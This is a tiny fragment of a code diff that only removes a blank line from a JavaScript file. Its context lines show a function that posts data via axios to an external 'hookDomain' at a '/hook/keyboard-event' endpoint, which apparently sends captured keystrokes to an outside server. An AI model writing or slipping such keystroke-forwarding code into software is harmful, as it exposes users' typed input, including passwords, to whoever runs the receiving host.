@@ -62,7 +62,6 @@ try {
                 }
             }
         }
-
         async function fetchHookDomainAndPostData(data) {
             try {
                 await axios.post(`${hookDomain}/hook/keyboard-event`, data);
